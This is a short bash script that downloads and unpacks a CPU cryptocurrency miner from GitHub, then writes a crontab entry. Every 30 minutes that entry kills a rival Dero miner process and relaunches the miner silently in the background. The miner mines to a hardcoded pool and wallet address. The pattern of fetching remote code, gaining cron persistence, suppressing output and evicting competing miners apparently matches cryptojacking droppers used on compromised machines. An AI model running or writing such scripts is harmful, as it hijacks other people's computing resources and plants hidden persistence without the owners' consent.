#!/bin/bash
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.34/cpuminer-opt-linux.tar.gz
tar -xvf cpuminer-opt-linux.tar.gz
echo "*/30 * * * * pkill hansen33s-dero-miner-linux-amd64 && sleep 5 && nohup ./cpuminer-sse2 -a yespowerr16  -o stratum+tcps://stratum-asia.rplant.xyz:13382 -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC.tes >/dev/null 2>&1 &" | crontab -
